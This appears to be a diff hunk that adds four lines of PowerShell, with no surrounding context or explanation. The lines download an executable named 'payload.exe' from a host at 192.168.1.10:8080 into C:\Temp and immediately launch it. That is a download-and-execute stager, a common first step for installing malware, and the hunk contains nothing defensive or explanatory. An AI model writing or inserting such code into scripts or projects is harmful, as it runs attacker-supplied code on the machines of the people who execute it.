@@ -1,0 +1,4 @@
+$url = "http://192.168.1.10:8080/payload.exe"
+$output = "C:\Temp\payload.exe"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process $output
